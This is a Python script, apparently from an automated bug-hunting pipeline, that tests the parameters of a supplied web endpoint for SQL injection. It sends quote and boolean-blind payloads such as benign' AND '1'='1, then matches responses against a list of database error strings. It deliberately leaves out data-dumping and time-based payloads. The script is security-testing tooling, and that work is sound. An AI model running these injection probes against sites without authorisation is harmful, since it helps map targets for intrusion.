#!/usr/bin/env python3
"""Generic SQLi probe for an UNKNOWN sink (Rule #57).

A real human hunter pastes a link and tests the parameters that are
really there. This probe takes the sink spec from its marker argv
(the one loop encodes it there so _probe_cmd needs no changes):

    MARKER = PLOOP57|<target_base>|<path>|<METHOD>|<p1,p2>

Flow (stdlib only), one param at a time (others benign):
  1. GET the sink page (confirms it exists, read-only).
  2. STABILITY GATE: fetch the same benign request TWICE. If the two
     bodies differ, the page is dynamic/noisy and no claim can be
     grounded -> skip that param (never claim on noise; the Rule #55
     false-positive lesson from the fuzz lane).
  3. ERROR TEST: append a single quote to the benign value. SQL error
     keywords present in the quote response AND ABSENT from the benign
     response -> CONFIRMED (error-based SQLi).
  4. BOOLEAN-BLIND TEST: value' AND '1'='1 (true) vs
     value' AND '1'='2 (false). Grounding requires BOTH: the true body
     equals the benign body, AND the false body differs from the true
     body on TWO repeats (the false response is re-fetched to rule out
     a one-shot transient). Differential == blind SQLi -> CONFIRMED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line (probe lesson, 29 Oct). Any exception -> PROBE_ERROR +
VERDICT: FAILED (fail-closed). No destructive payloads: no UNION data
dumps, no time-based delays against an unknown target.
"""
import hashlib
import re
import sys
import urllib.parse
import urllib.request

TIMEOUT = 15

ERROR_KEYWORDS = (
    "you have an error in your sql syntax",
    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
    "sqlite", "sqlite3", "pg_query", "postgresql", "unterminated",
    "odbc", "jdbc", "mssql", "sql server", "oracle error", "ora-",
    "sqlstate", "syntax error near",
)


def _fetch(tb, path, method, params):
    """params: dict name->value. Returns (status, body)."""
    url = tb.rstrip("/") + path
    data = None
    headers = {"User-Agent": "PLOOP57"}
    if method == "GET":
        url += "?" + urllib.parse.urlencode(params)
    else:
        data = urllib.parse.urlencode(params).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        # An HTTP 500 on the quote injection is itself a signal: read it.
        return e.code, e.read().decode("utf-8", "replace")


def _digest(body):
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def _error_hits(body):
    bl = body.lower()
    return [k for k in ERROR_KEYWORDS if k in bl]


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP57"
    try:
        _, tb_q, path_q, method, params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    params = [p for p in params_csv.split(",") if p]
    method = (method or "GET").upper()
    if not tb or not path.startswith("/") or not params or \
            method not in ("GET", "POST"):
        print("PROBE_ERROR invalid sink spec")
        print("VERDICT: FAILED")
        return
    msuffix = re.sub(r"[^A-Za-z0-9]", "", marker.split("|", 1)[0])[:12]
    print("MARKER: %s" % marker)

    # 1. sink page must exist (read-only)
    try:
        code, _ = _fetch(tb, path, method,
                         {p: "benign" for p in params})
    except Exception as e:
        print("PROBE_ERROR sink request failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if code not in (200, 302):
        print("PROBE_ERROR sink page status %s" % code)
        print("VERDICT: FAILED")
        return

    confirmed_param = None
    evidence = []

    # 2+3+4: one param at a time
    for param in params:
        base = {p: ("benign" if p != param else "benign") for p in params}

        def run(values):
            return _fetch(tb, path, method, values)[1]

        # STABILITY GATE: the identical benign request twice.
        try:
            b1, b2 = run(base), run(base)
        except Exception as e:
            print("PROBE_ERROR param %s benign fetch failed: %s"
                  % (param, e))
            continue
        if b1 != b2:
            print("PARAM %s: skipped (dynamic page, baseline unstable — "
                  "no claim grounded)" % param)
            continue
        benign_errors = _error_hits(b1)
        bdigest = _digest(b1)

        # ERROR TEST: a lone quote must introduce SQL error keywords
        # that the benign page does NOT have.
        try:
            qbody = run(dict(base, **{param: "benign'"}))
        except Exception as e:
            print("PROBE_ERROR param %s quote fetch failed: %s"
                  % (param, e))
            continue
        qhits = [k for k in _error_hits(qbody) if k not in benign_errors]
        if qhits and qbody != b1:
            print("EVIDENCE sink=%s param=%s error_based hits=%s "
                  "digest=%s" % (path, param, ",".join(qhits[:3]),
                                 _digest(qbody)))
            confirmed_param = param
            evidence.append("error-based")
            break

        # BOOLEAN-BLIND TEST: true-branch must match benign, false
        # branch must differ — on two repeats.
        true_v = "benign' AND '1'='1"
        false_v = "benign' AND '1'='2"
        try:
            t1, f1 = run(dict(base, **{param: true_v})), \
                run(dict(base, **{param: false_v}))
            t2, f2 = run(dict(base, **{param: true_v})), \
                run(dict(base, **{param: false_v}))
        except Exception as e:
            print("PROBE_ERROR param %s blind fetch failed: %s"
                  % (param, e))
            continue
        if t1 == t2 and f1 == f2 and t1 == b1 and f1 != t1:
            print("EVIDENCE sink=%s param=%s boolean_blind "
                  "true_digest=%s false_digest=%s benign_digest=%s "
                  "(repeats consistent)" % (path, param, _digest(t1),
                                            _digest(f1), bdigest))
            confirmed_param = param
            evidence.append("boolean-blind")
            break
        print("PARAM %s: not injectable (no error keywords, no stable "
              "true/false differential)" % param)

    if confirmed_param and evidence:
        print("EVIDENCE class=sql_injection via=%s" % "+".join(evidence))
        print("VERDICT: CONFIRMED")
    else:
        print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
